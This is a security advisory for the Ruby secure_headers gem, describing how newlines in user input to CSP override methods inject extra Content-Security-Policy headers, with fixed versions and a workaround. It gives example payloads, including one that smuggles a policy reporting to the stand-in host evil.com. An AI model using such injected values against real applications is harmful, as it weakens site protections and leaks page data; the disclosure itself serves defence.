summary: "Limited header injection when using dynamic overrides with user input in RubyGems\
  \ secure_headers\n### Impact\n\nIf user-supplied input was passed into append/override_content_security_policy_directives,\
  \ a newline could be injected leading to limited header injection.\n\nUpon seeing a newline\
  \ in the header, rails will silently create a new `Content-Security-Policy` header with the\
  \ remaining value of the original string. It will continue to create new headers for each\
  \ newline.\n\ne.g.\n\n```ruby\noverride_content_security_directives(script_src: ['mycdn.com',\
  \ \"\\ninjected\\n\"])` \n```\n\nwould result in \n\n```\nContent-Security-Policy: ... script-src:\
  \ mycdn.com\nContent-Security-Policy: injected\nContent-Security-Policy: rest-of-the-header\n\
  ```\n\nCSP supports multiple headers and all policies must be satisfied for execution to occur,\
  \ but a malicious value that reports the current page is fairly trivial:\n\n```ruby\noverride_content_security_directives(script_src:\
  \ [\"mycdn.com\", \"\\ndefault-src 'none'; report-uri evil.com\"]) \n```\n```\nContent-Security-Policy:\
  \ ... script-src: mycdn.com\nContent-Security-Policy: default-src 'none'; report-uri evil.com\n\
  Content-Security-Policy: rest-of-the-header\n```\n\n### Patches\n\nThis has been fixed in\
  \ 6.3.0, 5.2.0, and 3.9.0\n\n### Workarounds\n\n```ruby\noverride_content_security_policy_directives(:frame_src,\
  \ [user_input.gsub(\"\\n\", \" \")])\n```\n\n### References\n\nhttps://github.com/twitter/secure_headers/security/advisories/GHSA-xq52-rv6w-397c\n\
  [The effect of multiple policies](https://www.w3.org/TR/CSP3/#multiple-policies)\n\n### For\
  \ more information\n\nIf you have any questions or comments about this advisory:\n* Open an\
  \ issue in [this repo](https://github.com/twitter/secure_headers/security/advisories/new)\n\
  * DM us at @ndm on twitter"
